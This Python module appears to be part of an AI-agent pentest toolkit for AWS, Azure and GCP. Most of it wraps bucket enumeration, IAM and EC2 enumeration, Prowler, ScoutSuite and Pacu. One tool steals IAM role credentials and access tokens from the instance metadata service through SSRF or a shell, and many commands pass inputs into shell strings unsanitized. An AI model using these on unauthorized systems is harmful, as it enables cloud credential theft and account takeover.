#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
云安全工具包 - AWS/Azure/GCP 安全评估

支持的功能:
- AWS 安全配置审计
- Azure 资源枚举
- GCP 权限分析
- 多云环境渗透测试
- S3/Blob/GCS 存储桶枚举
- IAM 权限提升分析
- 云凭证提取和利用

用于CTF竞赛和授权的安全评估
"""

import os
import subprocess
import json
import re
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass
from enum import Enum

from .base import (
    BaseTool, tool, ToolCategory, RiskLevel,
    ToolResult, ResultStatus
)


class CloudProvider(Enum):
    """云服务提供商"""
    AWS = "aws"
    AZURE = "azure"
    GCP = "gcp"
    ALIBABA = "alibaba"
    TENCENT = "tencent"
    HUAWEI = "huawei"


@dataclass
class CloudTarget:
    """云目标信息"""
    provider: CloudProvider
    region: str = ""
    account_id: str = ""
    resources: List[str] = None


# ==================== AWS 安全工具 ====================

@tool(
    name="aws_s3_enum",
    category=ToolCategory.CLOUD,
    description="AWS S3存储桶枚举 - 发现公开的S3存储桶和敏感文件",
    risk_level=RiskLevel.LOW,
    timeout=300
)
class AWSS3Enum(BaseTool):
    """AWS S3存储桶枚举工具"""

    async def execute(self,
                     target: str,
                     wordlist: str = "",
                     check_permissions: bool = True,
                     download_files: bool = False) -> ToolResult:
        """
        枚举S3存储桶

        Args:
            target: 目标域名或公司名
            wordlist: 自定义字典
            check_permissions: 检查存储桶权限
            download_files: 下载发现的文件
        """
        results = {
            "target": target,
            "buckets_found": [],
            "public_buckets": [],
            "sensitive_files": [],
            "permissions": {}
        }

        # 生成可能的存储桶名称
        bucket_patterns = self._generate_bucket_names(target)

        for bucket_name in bucket_patterns:
            bucket_info = await self._check_bucket(bucket_name, check_permissions)
            if bucket_info:
                results["buckets_found"].append(bucket_info)
                if bucket_info.get("public"):
                    results["public_buckets"].append(bucket_name)

        # 如果有自定义字典
        if wordlist and os.path.exists(wordlist):
            with open(wordlist, 'r') as f:
                for line in f:
                    bucket_name = f"{target}-{line.strip()}"
                    bucket_info = await self._check_bucket(bucket_name, check_permissions)
                    if bucket_info:
                        results["buckets_found"].append(bucket_info)

        return ToolResult(
            status=ResultStatus.SUCCESS if results["buckets_found"] else ResultStatus.NO_RESULTS,
            data=results,
            summary=f"发现 {len(results['buckets_found'])} 个存储桶, {len(results['public_buckets'])} 个公开"
        )

    def _generate_bucket_names(self, target: str) -> List[str]:
        """生成可能的存储桶名称"""
        base = target.lower().replace(" ", "-").replace(".", "-")
        patterns = [
            base,
            f"{base}-backup",
            f"{base}-backups",
            f"{base}-data",
            f"{base}-files",
            f"{base}-uploads",
            f"{base}-assets",
            f"{base}-static",
            f"{base}-media",
            f"{base}-logs",
            f"{base}-dev",
            f"{base}-staging",
            f"{base}-prod",
            f"{base}-production",
            f"{base}-test",
            f"{base}-private",
            f"{base}-public",
            f"{base}-internal",
            f"{base}-config",
            f"{base}-secrets",
            f"backup-{base}",
            f"data-{base}",
            f"files-{base}",
        ]
        return patterns

    async def _check_bucket(self, bucket_name: str, check_permissions: bool) -> Optional[Dict]:
        """检查存储桶是否存在及权限"""
        try:
            # 使用curl检查存储桶
            cmd = f"curl -s -o /dev/null -w '%{{http_code}}' https://{bucket_name}.s3.amazonaws.com"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            status_code = result.stdout.strip()

            if status_code in ["200", "403", "301"]:
                bucket_info = {
                    "name": bucket_name,
                    "exists": True,
                    "status_code": status_code,
                    "public": status_code == "200"
                }

                if check_permissions and status_code == "200":
                    # 尝试列出内容
                    list_cmd = f"curl -s https://{bucket_name}.s3.amazonaws.com --max-time 10"
                    list_result = subprocess.run(list_cmd, shell=True, capture_output=True, text=True, timeout=15)
                    if "<Contents>" in list_result.stdout:
                        bucket_info["listable"] = True
                        # 提取文件列表
                        files = re.findall(r'<Key>([^<]+)</Key>', list_result.stdout)
                        bucket_info["files"] = files[:20]  # 只取前20个

                return bucket_info
        except Exception as e:
            pass
        return None


@tool(
    name="aws_iam_enum",
    category=ToolCategory.CLOUD,
    description="AWS IAM枚举 - 枚举IAM用户、角色和策略",
    risk_level=RiskLevel.MEDIUM,
    timeout=300
)
class AWSIAMEnum(BaseTool):
    """AWS IAM枚举工具"""

    async def execute(self,
                     access_key: str = "",
                     secret_key: str = "",
                     profile: str = "default",
                     region: str = "us-east-1") -> ToolResult:
        """
        枚举AWS IAM配置

        Args:
            access_key: AWS Access Key ID
            secret_key: AWS Secret Access Key
            profile: AWS CLI配置文件名
            region: AWS区域
        """
        results = {
            "users": [],
            "roles": [],
            "groups": [],
            "policies": [],
            "privilege_escalation_paths": [],
            "misconfigurations": []
        }

        # 设置环境变量
        env = os.environ.copy()
        if access_key and secret_key:
            env["AWS_ACCESS_KEY_ID"] = access_key
            env["AWS_SECRET_ACCESS_KEY"] = secret_key
        env["AWS_DEFAULT_REGION"] = region

        try:
            # 获取当前身份
            identity_cmd = "aws sts get-caller-identity --output json"
            identity_result = subprocess.run(
                identity_cmd, shell=True, capture_output=True, text=True,
                env=env, timeout=30
            )
            if identity_result.returncode == 0:
                results["current_identity"] = json.loads(identity_result.stdout)

            # 枚举用户
            users_cmd = "aws iam list-users --output json"
            users_result = subprocess.run(
                users_cmd, shell=True, capture_output=True, text=True,
                env=env, timeout=60
            )
            if users_result.returncode == 0:
                users_data = json.loads(users_result.stdout)
                results["users"] = users_data.get("Users", [])

            # 枚举角色
            roles_cmd = "aws iam list-roles --output json"
            roles_result = subprocess.run(
                roles_cmd, shell=True, capture_output=True, text=True,
                env=env, timeout=60
            )
            if roles_result.returncode == 0:
                roles_data = json.loads(roles_result.stdout)
                results["roles"] = roles_data.get("Roles", [])

            # 检查权限提升路径
            results["privilege_escalation_paths"] = self._check_privesc_paths(env)

        except Exception as e:
            return ToolResult(
                status=ResultStatus.ERROR,
                error=str(e),
                summary="IAM枚举失败"
            )

        return ToolResult(
            status=ResultStatus.SUCCESS,
            data=results,
            summary=f"发现 {len(results['users'])} 用户, {len(results['roles'])} 角色"
        )

    def _check_privesc_paths(self, env: dict) -> List[Dict]:
        """检查权限提升路径"""
        privesc_paths = []

        dangerous_permissions = [
            "iam:CreateAccessKey",
            "iam:CreateLoginProfile",
            "iam:UpdateLoginProfile",
            "iam:AttachUserPolicy",
            "iam:AttachRolePolicy",
            "iam:PutUserPolicy",
            "iam:PutRolePolicy",
            "iam:AddUserToGroup",
            "iam:UpdateAssumeRolePolicy",
            "sts:AssumeRole",
            "lambda:CreateFunction",
            "lambda:InvokeFunction",
            "lambda:UpdateFunctionCode",
            "ec2:RunInstances",
            "ssm:SendCommand",
        ]

        # 这里可以扩展更多的检查逻辑
        return privesc_paths


@tool(
    name="aws_ec2_enum",
    category=ToolCategory.CLOUD,
    description="AWS EC2枚举 - 枚举EC2实例和安全组",
    risk_level=RiskLevel.LOW,
    timeout=300
)
class AWSEC2Enum(BaseTool):
    """AWS EC2枚举工具"""

    async def execute(self,
                     access_key: str = "",
                     secret_key: str = "",
                     region: str = "us-east-1",
                     all_regions: bool = False) -> ToolResult:
        """
        枚举EC2实例

        Args:
            access_key: AWS Access Key ID
            secret_key: AWS Secret Access Key
            region: AWS区域
            all_regions: 扫描所有区域
        """
        results = {
            "instances": [],
            "security_groups": [],
            "public_instances": [],
            "exposed_ports": []
        }

        regions = [region]
        if all_regions:
            regions = [
                "us-east-1", "us-east-2", "us-west-1", "us-west-2",
                "eu-west-1", "eu-west-2", "eu-central-1",
                "ap-southeast-1", "ap-southeast-2", "ap-northeast-1"
            ]

        env = os.environ.copy()
        if access_key and secret_key:
            env["AWS_ACCESS_KEY_ID"] = access_key
            env["AWS_SECRET_ACCESS_KEY"] = secret_key

        for r in regions:
            env["AWS_DEFAULT_REGION"] = r

            # 枚举实例
            cmd = "aws ec2 describe-instances --output json"
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                env=env, timeout=60
            )

            if result.returncode == 0:
                data = json.loads(result.stdout)
                for reservation in data.get("Reservations", []):
                    for instance in reservation.get("Instances", []):
                        instance["region"] = r
                        results["instances"].append(instance)

                        # 检查是否有公网IP
                        if instance.get("PublicIpAddress"):
                            results["public_instances"].append({
                                "instance_id": instance.get("InstanceId"),
                                "public_ip": instance.get("PublicIpAddress"),
                                "region": r
                            })

            # 枚举安全组
            sg_cmd = "aws ec2 describe-security-groups --output json"
            sg_result = subprocess.run(
                sg_cmd, shell=True, capture_output=True, text=True,
                env=env, timeout=60
            )

            if sg_result.returncode == 0:
                sg_data = json.loads(sg_result.stdout)
                for sg in sg_data.get("SecurityGroups", []):
                    sg["region"] = r
                    results["security_groups"].append(sg)

                    # 检查开放的端口
                    for rule in sg.get("IpPermissions", []):
                        for ip_range in rule.get("IpRanges", []):
                            if ip_range.get("CidrIp") == "0.0.0.0/0":
                                results["exposed_ports"].append({
                                    "security_group": sg.get("GroupId"),
                                    "port": rule.get("FromPort"),
                                    "protocol": rule.get("IpProtocol"),
                                    "region": r
                                })

        return ToolResult(
            status=ResultStatus.SUCCESS,
            data=results,
            summary=f"发现 {len(results['instances'])} 实例, {len(results['public_instances'])} 公网"
        )


@tool(
    name="prowler_scan",
    category=ToolCategory.CLOUD,
    description="Prowler AWS安全审计 - 全面的AWS安全配置检查",
    risk_level=RiskLevel.LOW,
    timeout=600
)
class ProwlerScan(BaseTool):
    """Prowler AWS安全审计"""

    async def execute(self,
                     checks: str = "",
                     compliance: str = "",
                     region: str = "",
                     output_format: str = "json") -> ToolResult:
        """
        运行Prowler安全审计

        Args:
            checks: 特定检查项 (如 "check11,check12")
            compliance: 合规框架 (cis, pci, hipaa, gdpr)
            region: AWS区域
            output_format: 输出格式
        """
        cmd = ["prowler"]

        if checks:
            cmd.extend(["-c", checks])
        if compliance:
            cmd.extend(["-M", compliance])
        if region:
            cmd.extend(["-f", region])

        cmd.extend(["-o", output_format])

        try:
            result = subprocess.run(
                " ".join(cmd), shell=True, capture_output=True, text=True,
                timeout=600
            )

            findings = []
            if output_format == "json" and result.stdout:
                try:
                    findings = json.loads(result.stdout)
                except:
                    findings = result.stdout
            else:
                findings = result.stdout

            return ToolResult(
                status=ResultStatus.SUCCESS,
                data={"findings": findings, "raw_output": result.stdout},
                summary="Prowler扫描完成"
            )

        except FileNotFoundError:
            return ToolResult(
                status=ResultStatus.ERROR,
                error="Prowler未安装。安装: pip install prowler",
                summary="Prowler未安装"
            )
        except Exception as e:
            return ToolResult(
                status=ResultStatus.ERROR,
                error=str(e),
                summary="Prowler扫描失败"
            )


@tool(
    name="pacu_attack",
    category=ToolCategory.CLOUD,
    description="Pacu AWS漏洞利用 - AWS渗透测试框架",
    risk_level=RiskLevel.HIGH,
    timeout=600
)
class PacuAttack(BaseTool):
    """Pacu AWS渗透测试框架"""

    async def execute(self,
                     module: str,
                     access_key: str = "",
                     secret_key: str = "",
                     args: str = "") -> ToolResult:
        """
        执行Pacu模块

        Args:
            module: Pacu模块名 (如 iam__enum_users)
            access_key: AWS Access Key ID
            secret_key: AWS Secret Access Key
            args: 模块参数
        """
        # Pacu常用模块
        common_modules = {
            "iam__enum_users": "枚举IAM用户",
            "iam__enum_roles": "枚举IAM角色",
            "iam__privesc_scan": "权限提升扫描",
            "ec2__enum": "枚举EC2实例",
            "s3__enum": "枚举S3存储桶",
            "lambda__enum": "枚举Lambda函数",
            "rds__enum": "枚举RDS实例",
            "ecs__enum": "枚举ECS集群",
            "secrets__enum": "枚举Secrets Manager",
            "ssm__enum": "枚举SSM参数",
        }

        if module not in common_modules and not module.startswith("iam__") and not module.startswith("ec2__"):
            return ToolResult(
                status=ResultStatus.ERROR,
                error=f"未知模块: {module}。可用模块: {list(common_modules.keys())}",
                summary="模块不存在"
            )

        # 构建Pacu命令
        cmd = f"pacu --module {module}"
        if args:
            cmd += f" {args}"

        env = os.environ.copy()
        if access_key and secret_key:
            env["AWS_ACCESS_KEY_ID"] = access_key
            env["AWS_SECRET_ACCESS_KEY"] = secret_key

        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                env=env, timeout=300
            )

            return ToolResult(
                status=ResultStatus.SUCCESS if result.returncode == 0 else ResultStatus.ERROR,
                data={"output": result.stdout, "stderr": result.stderr},
                summary=f"Pacu模块 {module} 执行完成"
            )

        except FileNotFoundError:
            return ToolResult(
                status=ResultStatus.ERROR,
                error="Pacu未安装。安装: pip install pacu",
                summary="Pacu未安装"
            )


# ==================== Azure 安全工具 ====================

@tool(
    name="azure_blob_enum",
    category=ToolCategory.CLOUD,
    description="Azure Blob存储枚举 - 发现公开的Blob容器",
    risk_level=RiskLevel.LOW,
    timeout=300
)
class AzureBlobEnum(BaseTool):
    """Azure Blob存储枚举"""

    async def execute(self,
                     target: str,
                     wordlist: str = "") -> ToolResult:
        """
        枚举Azure Blob存储

        Args:
            target: 目标存储账户名或公司名
            wordlist: 自定义字典
        """
        results = {
            "target": target,
            "storage_accounts": [],
            "public_containers": [],
            "files": []
        }

        # 生成可能的存储账户名
        account_patterns = self._generate_account_names(target)

        for account in account_patterns:
            containers = await self._check_storage_account(account)
            if containers:
                results["storage_accounts"].append(account)
                results["public_containers"].extend(containers)

        return ToolResult(
            status=ResultStatus.SUCCESS if results["storage_accounts"] else ResultStatus.NO_RESULTS,
            data=results,
            summary=f"发现 {len(results['storage_accounts'])} 存储账户"
        )

    def _generate_account_names(self, target: str) -> List[str]:
        """生成可能的存储账户名"""
        base = target.lower().replace(" ", "").replace("-", "").replace(".", "")[:20]
        patterns = [
            base,
            f"{base}storage",
            f"{base}blob",
            f"{base}files",
            f"{base}data",
            f"{base}backup",
            f"{base}dev",
            f"{base}prod",
            f"storage{base}",
            f"blob{base}",
        ]
        return patterns

    async def _check_storage_account(self, account: str) -> List[Dict]:
        """检查存储账户"""
        containers = []
        common_containers = ["$web", "public", "data", "files", "images", "backup"]

        for container in common_containers:
            url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
            try:
                cmd = f"curl -s -o /dev/null -w '%{{http_code}}' '{url}'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)

                if result.stdout.strip() == "200":
                    containers.append({
                        "account": account,
                        "container": container,
                        "public": True
                    })
            except:
                pass

        return containers


@tool(
    name="azurehound_enum",
    category=ToolCategory.CLOUD,
    description="AzureHound枚举 - Azure AD和资源枚举",
    risk_level=RiskLevel.MEDIUM,
    timeout=600
)
class AzureHoundEnum(BaseTool):
    """AzureHound Azure枚举"""

    async def execute(self,
                     tenant_id: str = "",
                     client_id: str = "",
                     client_secret: str = "",
                     username: str = "",
                     password: str = "") -> ToolResult:
        """
        运行AzureHound枚举

        Args:
            tenant_id: Azure租户ID
            client_id: 应用程序ID
            client_secret: 客户端密钥
            username: 用户名（备选认证）
            password: 密码
        """
        cmd = ["azurehound"]

        if tenant_id:
            cmd.extend(["-t", tenant_id])
        if client_id and client_secret:
            cmd.extend(["-a", client_id, "-s", client_secret])
        elif username and password:
            cmd.extend(["-u", username, "-p", password])

        cmd.extend(["-o", "/tmp/azurehound_output.json"])

        try:
            result = subprocess.run(
                " ".join(cmd), shell=True, capture_output=True, text=True,
                timeout=600
            )

            output_data = {}
            if os.path.exists("/tmp/azurehound_output.json"):
                with open("/tmp/azurehound_output.json", 'r') as f:
                    output_data = json.load(f)

            return ToolResult(
                status=ResultStatus.SUCCESS,
                data=output_data,
                summary="AzureHound枚举完成"
            )

        except FileNotFoundError:
            return ToolResult(
                status=ResultStatus.ERROR,
                error="AzureHound未安装",
                summary="AzureHound未安装"
            )


# ==================== GCP 安全工具 ====================

@tool(
    name="gcp_bucket_enum",
    category=ToolCategory.CLOUD,
    description="GCP存储桶枚举 - 发现公开的GCS存储桶",
    risk_level=RiskLevel.LOW,
    timeout=300
)
class GCPBucketEnum(BaseTool):
    """GCP存储桶枚举"""

    async def execute(self,
                     target: str,
                     wordlist: str = "") -> ToolResult:
        """
        枚举GCP存储桶

        Args:
            target: 目标项目名或公司名
            wordlist: 自定义字典
        """
        results = {
            "target": target,
            "buckets_found": [],
            "public_buckets": [],
            "files": []
        }

        # 生成可能的存储桶名
        bucket_patterns = self._generate_bucket_names(target)

        for bucket in bucket_patterns:
            bucket_info = await self._check_bucket(bucket)
            if bucket_info:
                results["buckets_found"].append(bucket_info)
                if bucket_info.get("public"):
                    results["public_buckets"].append(bucket)

        return ToolResult(
            status=ResultStatus.SUCCESS if results["buckets_found"] else ResultStatus.NO_RESULTS,
            data=results,
            summary=f"发现 {len(results['buckets_found'])} 存储桶"
        )

    def _generate_bucket_names(self, target: str) -> List[str]:
        """生成可能的存储桶名"""
        base = target.lower().replace(" ", "-")
        patterns = [
            base,
            f"{base}-bucket",
            f"{base}-storage",
            f"{base}-data",
            f"{base}-backup",
            f"{base}-files",
            f"{base}-assets",
            f"{base}-public",
            f"{base}-private",
            f"{base}-dev",
            f"{base}-prod",
        ]
        return patterns

    async def _check_bucket(self, bucket: str) -> Optional[Dict]:
        """检查存储桶"""
        try:
            url = f"https://storage.googleapis.com/{bucket}"
            cmd = f"curl -s -o /dev/null -w '%{{http_code}}' '{url}'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)

            status = result.stdout.strip()
            if status in ["200", "403"]:
                return {
                    "name": bucket,
                    "exists": True,
                    "public": status == "200",
                    "url": url
                }
        except:
            pass
        return None


@tool(
    name="gcp_iam_enum",
    category=ToolCategory.CLOUD,
    description="GCP IAM枚举 - 枚举GCP项目IAM配置",
    risk_level=RiskLevel.MEDIUM,
    timeout=300
)
class GCPIAMEnum(BaseTool):
    """GCP IAM枚举"""

    async def execute(self,
                     project_id: str,
                     credentials_file: str = "") -> ToolResult:
        """
        枚举GCP IAM配置

        Args:
            project_id: GCP项目ID
            credentials_file: 服务账户JSON文件路径
        """
        results = {
            "project": project_id,
            "service_accounts": [],
            "iam_bindings": [],
            "dangerous_permissions": []
        }

        env = os.environ.copy()
        if credentials_file:
            env["GOOGLE_APPLICATION_CREDENTIALS"] = credentials_file

        try:
            # 枚举服务账户
            sa_cmd = f"gcloud iam service-accounts list --project={project_id} --format=json"
            sa_result = subprocess.run(
                sa_cmd, shell=True, capture_output=True, text=True,
                env=env, timeout=60
            )
            if sa_result.returncode == 0:
                results["service_accounts"] = json.loads(sa_result.stdout)

            # 获取IAM策略
            iam_cmd = f"gcloud projects get-iam-policy {project_id} --format=json"
            iam_result = subprocess.run(
                iam_cmd, shell=True, capture_output=True, text=True,
                env=env, timeout=60
            )
            if iam_result.returncode == 0:
                policy = json.loads(iam_result.stdout)
                results["iam_bindings"] = policy.get("bindings", [])

            # 检查危险权限
            dangerous_roles = [
                "roles/owner",
                "roles/editor",
                "roles/iam.securityAdmin",
                "roles/iam.serviceAccountAdmin",
                "roles/iam.serviceAccountKeyAdmin",
                "roles/compute.admin",
                "roles/storage.admin",
            ]

            for binding in results["iam_bindings"]:
                if binding.get("role") in dangerous_roles:
                    results["dangerous_permissions"].append(binding)

            return ToolResult(
                status=ResultStatus.SUCCESS,
                data=results,
                summary=f"发现 {len(results['service_accounts'])} 服务账户"
            )

        except Exception as e:
            return ToolResult(
                status=ResultStatus.ERROR,
                error=str(e),
                summary="GCP IAM枚举失败"
            )


# ==================== 多云工具 ====================

@tool(
    name="cloud_enum",
    category=ToolCategory.CLOUD,
    description="多云资源枚举 - 自动检测和枚举AWS/Azure/GCP资源",
    risk_level=RiskLevel.LOW,
    timeout=600
)
class CloudEnum(BaseTool):
    """多云资源枚举"""

    async def execute(self,
                     target: str,
                     providers: str = "all",
                     wordlist: str = "") -> ToolResult:
        """
        枚举多云资源

        Args:
            target: 目标域名或公司名
            providers: 云提供商 (aws,azure,gcp 或 all)
            wordlist: 自定义字典
        """
        results = {
            "target": target,
            "aws": {"buckets": [], "status": "pending"},
            "azure": {"containers": [], "status": "pending"},
            "gcp": {"buckets": [], "status": "pending"}
        }

        provider_list = ["aws", "azure", "gcp"] if providers == "all" else providers.split(",")

        if "aws" in provider_list:
            s3_tool = AWSS3Enum()
            s3_result = await s3_tool.execute(target, wordlist)
            results["aws"] = {
                "buckets": s3_result.data.get("buckets_found", []) if s3_result.data else [],
                "status": s3_result.status.value
            }

        if "azure" in provider_list:
            blob_tool = AzureBlobEnum()
            blob_result = await blob_tool.execute(target, wordlist)
            results["azure"] = {
                "containers": blob_result.data.get("public_containers", []) if blob_result.data else [],
                "status": blob_result.status.value
            }

        if "gcp" in provider_list:
            gcs_tool = GCPBucketEnum()
            gcs_result = await gcs_tool.execute(target, wordlist)
            results["gcp"] = {
                "buckets": gcs_result.data.get("buckets_found", []) if gcs_result.data else [],
                "status": gcs_result.status.value
            }

        total = (len(results["aws"]["buckets"]) +
                len(results["azure"]["containers"]) +
                len(results["gcp"]["buckets"]))

        return ToolResult(
            status=ResultStatus.SUCCESS,
            data=results,
            summary=f"多云枚举完成，共发现 {total} 个资源"
        )


@tool(
    name="scoutsuite_scan",
    category=ToolCategory.CLOUD,
    description="ScoutSuite多云安全审计 - AWS/Azure/GCP/阿里云安全配置检查",
    risk_level=RiskLevel.LOW,
    timeout=1200
)
class ScoutSuiteScan(BaseTool):
    """ScoutSuite多云安全审计"""

    async def execute(self,
                     provider: str,
                     profile: str = "",
                     regions: str = "",
                     services: str = "") -> ToolResult:
        """
        运行ScoutSuite安全审计

        Args:
            provider: 云提供商 (aws, azure, gcp, alibaba)
            profile: 配置文件名
            regions: 区域列表
            services: 服务列表
        """
        cmd = ["scout", provider]

        if profile:
            cmd.extend(["--profile", profile])
        if regions:
            cmd.extend(["--regions", regions])
        if services:
            cmd.extend(["--services", services])

        cmd.extend(["--report-dir", "/tmp/scoutsuite_report"])

        try:
            result = subprocess.run(
                " ".join(cmd), shell=True, capture_output=True, text=True,
                timeout=1200
            )

            report_data = {}
            report_file = f"/tmp/scoutsuite_report/scoutsuite-results/scoutsuite_results_{provider}.js"
            if os.path.exists(report_file):
                with open(report_file, 'r') as f:
                    content = f.read()
                    # 提取JSON数据
                    if "scoutsuite_results =" in content:
                        json_str = content.split("scoutsuite_results =")[1].strip().rstrip(";")
                        report_data = json.loads(json_str)

            return ToolResult(
                status=ResultStatus.SUCCESS,
                data=report_data,
                summary=f"ScoutSuite {provider} 审计完成"
            )

        except FileNotFoundError:
            return ToolResult(
                status=ResultStatus.ERROR,
                error="ScoutSuite未安装。安装: pip install scoutsuite",
                summary="ScoutSuite未安装"
            )


@tool(
    name="cloud_metadata_extract",
    category=ToolCategory.CLOUD,
    description="云元数据提取 - 从SSRF/RCE提取云实例元数据",
    risk_level=RiskLevel.HIGH,
    timeout=120
)
class CloudMetadataExtract(BaseTool):
    """云实例元数据提取"""

    async def execute(self,
                     ssrf_url: str = "",
                     shell_access: bool = False,
                     provider: str = "auto") -> ToolResult:
        """
        提取云实例元数据

        Args:
            ssrf_url: SSRF漏洞URL模板 (使用{url}占位符)
            shell_access: 是否有shell访问权限
            provider: 云提供商 (aws, azure, gcp, auto)
        """
        results = {
            "provider": provider,
            "credentials": {},
            "instance_info": {},
            "network_info": {},
            "user_data": ""
        }

        # 元数据端点
        metadata_endpoints = {
            "aws": {
                "base": "http://169.254.169.254/latest/",
                "token_url": "http://169.254.169.254/latest/api/token",
                "endpoints": {
                    "instance_id": "meta-data/instance-id",
                    "ami_id": "meta-data/ami-id",
                    "security_groups": "meta-data/security-groups",
                    "iam_role": "meta-data/iam/security-credentials/",
                    "user_data": "user-data",
                    "public_ip": "meta-data/public-ipv4",
                    "local_ip": "meta-data/local-ipv4",
                }
            },
            "azure": {
                "base": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "header": "Metadata: true"
            },
            "gcp": {
                "base": "http://169.254.169.254/computeMetadata/v1/",
                "header": "Metadata-Flavor: Google",
                "endpoints": {
                    "project_id": "project/project-id",
                    "instance_name": "instance/name",
                    "service_accounts": "instance/service-accounts/",
                    "access_token": "instance/service-accounts/default/token",
                }
            }
        }

        if shell_access:
            # 直接通过curl获取
            results = await self._extract_with_curl(metadata_endpoints, provider)
        elif ssrf_url:
            # 通过SSRF获取
            results = await self._extract_with_ssrf(ssrf_url, metadata_endpoints, provider)
        else:
            return ToolResult(
                status=ResultStatus.ERROR,
                error="需要提供 ssrf_url 或设置 shell_access=True",
                summary="缺少访问方式"
            )

        return ToolResult(
            status=ResultStatus.SUCCESS if results.get("credentials") else ResultStatus.NO_RESULTS,
            data=results,
            summary=f"提取 {provider} 元数据"
        )

    async def _extract_with_curl(self, endpoints: dict, provider: str) -> Dict:
        """使用curl提取元数据"""
        results = {"provider": provider, "credentials": {}, "instance_info": {}}

        providers = [provider] if provider != "auto" else ["aws", "gcp", "azure"]

        for p in providers:
            if p == "aws":
                # 检查是否需要IMDSv2 token
                token_cmd = "curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token"
                token_result = subprocess.run(token_cmd, shell=True, capture_output=True, text=True, timeout=5)
                token = token_result.stdout.strip()

                if token:
                    header = f"-H 'X-aws-ec2-metadata-token: {token}'"
                else:
                    header = ""

                # 获取IAM角色凭证
                role_cmd = f"curl -s {header} http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                role_result = subprocess.run(role_cmd, shell=True, capture_output=True, text=True, timeout=5)

                if role_result.stdout:
                    role_name = role_result.stdout.strip()
                    creds_cmd = f"curl -s {header} http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
                    creds_result = subprocess.run(creds_cmd, shell=True, capture_output=True, text=True, timeout=5)

                    if creds_result.stdout:
                        try:
                            results["credentials"] = json.loads(creds_result.stdout)
                            results["provider"] = "aws"
                        except:
                            pass

            elif p == "gcp":
                token_cmd = "curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
                token_result = subprocess.run(token_cmd, shell=True, capture_output=True, text=True, timeout=5)

                if token_result.stdout and "access_token" in token_result.stdout:
                    try:
                        results["credentials"] = json.loads(token_result.stdout)
                        results["provider"] = "gcp"
                    except:
                        pass

        return results

    async def _extract_with_ssrf(self, ssrf_url: str, endpoints: dict, provider: str) -> Dict:
        """通过SSRF提取元数据"""
        results = {"provider": provider, "credentials": {}, "instance_info": {}}

        # AWS元数据
        if provider in ["aws", "auto"]:
            target_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            full_url = ssrf_url.replace("{url}", target_url)

            try:
                result = subprocess.run(
                    f"curl -s '{full_url}'", shell=True,
                    capture_output=True, text=True, timeout=10
                )
                if result.stdout and not result.stdout.startswith("<!"):
                    results["provider"] = "aws"
                    role_name = result.stdout.strip().split('\n')[0]

                    # 获取凭证
                    creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
                    creds_full = ssrf_url.replace("{url}", creds_url)
                    creds_result = subprocess.run(
                        f"curl -s '{creds_full}'", shell=True,
                        capture_output=True, text=True, timeout=10
                    )
                    if creds_result.stdout:
                        try:
                            results["credentials"] = json.loads(creds_result.stdout)
                        except:
                            pass
            except:
                pass

        return results


# 导出所有工具
__all__ = [
    "AWSS3Enum",
    "AWSIAMEnum",
    "AWSEC2Enum",
    "ProwlerScan",
    "PacuAttack",
    "AzureBlobEnum",
    "AzureHoundEnum",
    "GCPBucketEnum",
    "GCPIAMEnum",
    "CloudEnum",
    "ScoutSuiteScan",
    "CloudMetadataExtract",
]
